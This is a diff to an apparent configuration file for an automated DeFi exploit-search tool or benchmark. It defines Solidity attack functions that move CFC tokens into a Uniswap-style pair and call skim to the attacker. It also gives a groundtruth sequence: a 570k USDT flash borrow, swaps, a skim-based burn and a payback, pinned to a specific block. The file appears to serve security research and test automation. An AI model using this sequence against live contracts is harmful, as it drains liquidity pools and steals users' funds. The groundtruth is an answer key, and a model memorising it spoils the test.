@@ -6,7 +6,7 @@ ctrt_name2cls:
   - ["safe", "SAFE"]
   - ["cfc", "CFC"]
   - ["safeusdtPair", "UniswapV2Pair"]
-  - ["CakeLP", "UniswapV2Pair"]
+  - ["pair", "UniswapV2Pair"]
   - ["usdtcfc", "USDTCFC"]
   - ["factory", "UniswapV2Factory"]
   - ["router", "UniswapV2Router"]
@@ -17,35 +17,32 @@ ctrt_name2deploy:
   - ["cfc", "new CFC(address(safe))"]
   - ["usdtcfc", "new USDTCFC() "]
   - ["safeusdtPair", ""]
-  - ["CakeLP", ""]
+  - ["pair", ""]
   - ["factory", ""]
   - ["router", ""]
   
 extra_actions: 
-  - "function burn_cfc_CakeLP(uint256 amount) internal eurus {
-    cfc.transfer(address(CakeLP), amount);
-    CakeLP.skim(attacker);
-    amount /= 15;
-    cfc.transfer(address(CakeLP), amount);
-    CakeLP.skim(attacker); }"
+  - "function burn_cfc_pair(uint256 amount) internal eurus {
+    cfc.transfer(address(pair), amount);
+    pair.skim(attacker);
+    amount /= 2;
+    cfc.transfer(address(pair), amount);
+    pair.skim(attacker); }"
   - "function swap_usdtcfc_attacker_usdt_cfc(uint256 amount, uint256 amountOut) internal eurus {
       usdt.transfer(address(safeusdtPair), amount);
       safeusdtPair.swap(amountOut, 0, attacker, new bytes(0));
       uint256 amountOfSafe = safe.balanceOf(attacker);
-      safe.transfer(address(CakeLP), safe.balanceOf(attacker));
-      CakeLP.swap(
+      safe.transfer(address(pair), safe.balanceOf(attacker));
+      pair.swap(
           1,
-          CakeLP.getAmountOut(amountOfSafe, address(safe)),
+          pair.getAmountOut(amountOfSafe, address(safe)),
           attacker,
           new bytes(0)
       );   
     }"
   - "function swap_usdtcfc_attacker_cfc_usdt(uint256 amount, uint256 amountOut) internal eurus {
-      cfc.transfer(address(CakeLP), amount);
-      CakeLP.swap(amountOut, 0, attacker, new bytes(0));
-      amountOut /= 3;
-      cfc.transfer(address(CakeLP), amount);
-      CakeLP.swap(amountOut, 0, attacker, new bytes(0));
+      cfc.transfer(address(pair), amount);
+      pair.swap(amountOut, 0, attacker, new bytes(0));
       uint256 amountOfSafe = safe.balanceOf(attacker);
       safe.transfer(address(safeusdtPair), safe.balanceOf(attacker));
       safeusdtPair.swap(
@@ -58,18 +55,19 @@ extra_actions:
 
 
 extra_deployments:
-  - "cfc.afterDeploy(address(router), address(CakeLP));"
+  - "cfc.afterDeploy(address(router), address(pair));"
 
-extra_statements: []
+extra_statements:
+  - "vm.warp(blockTimestamp);
+    vm.roll(29668034);"
 
 attack_goal_str: "usdt"
 
 groundtruth:
   - ["borrow", "usdt", "owner", "57 * 1e22"]
   - ["swap", "usdtcfc", "attacker", "usdt", "cfc", "13 * 1e21", "safeusdtPair.getAmountOut(13 * 1e21, address(usdt))"]
-  - ["burn", "cfc", "CakeLP", "cfc.balanceOf(address(attacker)) * 15 /16"]
-  - ["burn", "cfc", "CakeLP", "cfc.balanceOf(address(CakeLP)) - 1"]
-  - ["swap", "usdtcfc", "attacker", "cfc", "usdt", "cfc.balanceOf(attacker) / 200", "CakeLP.getAmountOut(cfc.balanceOf(attacker) /200, address(cfc))"]
+  - ["burn", "cfc", "pair", "36000 ether"]
+  - ["swap", "usdtcfc", "attacker", "cfc", "usdt", "cfc.balanceOf(attacker)", "pair.getAmountOut(cfc.balanceOf(attacker), address(cfc)) * 8 / 10"]
   - ["payback", "usdt", "owner", "57 * 1e22"]
 
 # Information for search space building.
@@ -95,7 +93,7 @@ roles:
       "bept": ["safe", "usdt"]
     is_oracle: true
     oracle: "pair"
-  "CakeLP":
+  "pair":
     is_swappair: true
     is_uniswap: true
     token_pair: ["safe", "cfc"]
@@ -104,7 +102,7 @@ roles:
       "cfc": ["safe", "cfc"]
     is_oracle: true
     oracle: "pair"
-  "USDTCFC":
+  "usdtcfc":
     is_swappair: true
     token_pair: ["usdt", "cfc"]
     support_swaps:
